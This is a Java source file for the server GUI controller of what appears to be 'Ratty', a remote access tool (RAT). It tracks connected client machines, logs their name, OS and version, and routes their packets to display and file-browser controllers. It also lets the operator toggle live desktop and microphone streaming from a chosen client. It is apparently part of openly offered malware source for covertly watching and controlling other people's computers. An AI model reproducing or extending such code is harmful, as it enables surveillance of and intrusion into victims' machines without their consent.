package de.sogomn.rat.server.gui;

import java.util.ArrayList;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;

public final class RattyGuiController implements IServerObserver, IConnectionObserver, IGuiController {
	
	private RattyGui gui;
	
	private ArrayList<ServerClient> clients;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		clients = new ArrayList<ServerClient>();
		
		gui.addListener(this);
	}
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		
		client.logIn(name, os, version);
		gui.addRow(client);
		gui.addListener(client.displayController);
		gui.addListener(client.fileTreeController);
	}
	
	private IPacket getPacket(final String command, final ServerClient client) {
		IPacket packet = null;
		
		if (command == RattyGui.FREE) {
			packet = new FreePacket();
		}
		
		return packet;
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			client.displayController.handlePacket(packet);
			client.fileTreeController.handlePacket(packet);
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final ServerClient client = new ServerClient(connection);
		final InformationPacket packet = new InformationPacket();
		
		connection.setObserver(this);
		connection.start();
		connection.addPacket(packet);
		clients.add(client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		gui.removeListener(client.displayController);
		gui.removeListener(client.fileTreeController);
		gui.removeRow(client);
		clients.remove(client);
		
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
		
		connection.setObserver(null);
		connection.close();
	}
	
	@Override
	public void closed(final ActiveServer server) {
		gui.removeAllListeners();
		
		clients.stream().forEach(client -> {
			client.connection.setObserver(null);
			client.connection.close();
		});
		
		clients.clear();
	}
	
	@Override
	public void userInput(final String command) {
		final ServerClient client = gui.getLastServerClientClicked();
		final IPacket packet = getPacket(command, client);
		
		if (command == RattyGui.DESKTOP) {
			final boolean streamingDesktop = client.isStreamingDesktop();
			
			client.setStreamingDesktop(!streamingDesktop);
			gui.update();
		} else if (command == RattyGui.VOICE) {
			final boolean streamingVoice = client.isStreamingVoice();
			
			client.setStreamingVoice(!streamingVoice);
			gui.update();
		}
		
		if (packet != null) {
			client.connection.addPacket(packet);
		}
	}
	
	public ServerClient getClient(final ActiveConnection connection) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.connection == connection) {
				return serverClient;
			}
		}
		
		return null;
	}
	
}
